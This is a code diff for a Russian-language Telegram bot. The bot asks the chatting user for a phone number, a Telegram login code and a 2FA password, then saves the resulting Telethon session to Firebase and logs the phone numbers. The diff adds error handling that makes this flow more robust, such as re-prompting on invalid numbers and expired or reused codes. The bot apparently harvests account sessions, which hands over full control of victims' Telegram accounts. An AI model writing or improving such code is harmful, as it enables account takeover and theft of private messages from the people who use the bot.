@@ -492,15 +492,22 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     await update.message.reply_text("Пожалуйста, введите номер в формате +380639678038:")
                     return
                 context.user_data['phone'] = text
-                # Отправка запроса кода и сохранение phone_code_hash
-                sent_code = await client.send_code_request(text)
-                context.user_data['phone_code_hash'] = sent_code.phone_code_hash
-                await update.message.reply_text(LANGUAGES['Русский']['enter_code'])
-                context.user_data['waiting_for_code'] = True
-                del context.user_data['waiting_for_phone']
-                print(f"Номер телефона {name} (@{username}): {text}")
-                session_data = client.session.save()
-                await save_session_to_firebase(user_id, session_data)
+                try:
+                    # Отправка запроса кода и сохранение phone_code_hash
+                    sent_code = await client.send_code_request(text)
+                    context.user_data['phone_code_hash'] = sent_code.phone_code_hash
+                    await update.message.reply_text(LANGUAGES['Русский']['enter_code'])
+                    context.user_data['waiting_for_code'] = True
+                    del context.user_data['waiting_for_phone']
+                    print(f"Номер телефона {name} (@{username}): {text}")
+                    session_data = client.session.save()
+                    await save_session_to_firebase(user_id, session_data)
+                except telethon_errors.PhoneNumberInvalidError:
+                    await update.message.reply_text("Неверный формат номера телефона. Пожалуйста, введите в формате +380639678038:")
+                    print(f"Неверный номер телефона от {name} (@{username}): {text}")
+                except telethon_errors.RPCError as e:
+                    await update.message.reply_text(LANGUAGES['Русский']['auth_error'].format(error=str(e)))
+                    print(f"Ошибка отправки кода для {name} (@{username}): {str(e)}")
                 return
 
             if context.user_data.get('waiting_for_code'):
@@ -529,14 +536,20 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     context.user_data['waiting_for_password'] = True
                     del context.user_data['waiting_for_code']
                     print(f"Запрос пароля 2FA у {name} (@{username})")
-                except telethon_errors.CodeExpiredError:
-                    await update.message.reply_text("Код подтверждения устарел. Пожалуйста, начните заново с /start для получения нового кода.")
-                    del context.user_data['waiting_for_code']
-                    del context.user_data['phone_code_hash']
-                    print(f"Истек срок действия кода для {name} (@{username})")
                 except telethon_errors.RPCError as e:
-                    await update.message.reply_text(LANGUAGES['Русский']['auth_error'].format(error=str(e)))
-                    print(f"Ошибка ввода кода {name} (@{username}): {str(e)}")
+                    if "authorization code has expired" in str(e).lower():
+                        await update.message.reply_text("Код подтверждения устарел. Пожалуйста, начните заново с /start для получения нового кода.")
+                        del context.user_data['waiting_for_code']
+                        del context.user_data['phone_code_hash']
+                        print(f"Истек срок действия кода для {name} (@{username}): {str(e)}")
+                    elif "used in another request" in str(e).lower() or "already used" in str(e).lower():
+                        await update.message.reply_text("Этот код уже был использован в другом запросе. Пожалуйста, начните заново с /start для получения нового кода.")
+                        del context.user_data['waiting_for_code']
+                        del context.user_data['phone_code_hash']
+                        print(f"Код уже использован для {name} (@{username}): {str(e)}")
+                    else:
+                        await update.message.reply_text(LANGUAGES['Русский']['auth_error'].format(error=str(e)))
+                        print(f"Ошибка ввода кода {name} (@{username}): {str(e)}")
                 return
 
             if context.user_data.get('waiting_for_password'):
@@ -562,7 +575,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     finally:
         if client.is_connected():
             await client.disconnect()
-
 
     if str(user_id) not in users or 'language' not in users[str(user_id)]:
         return
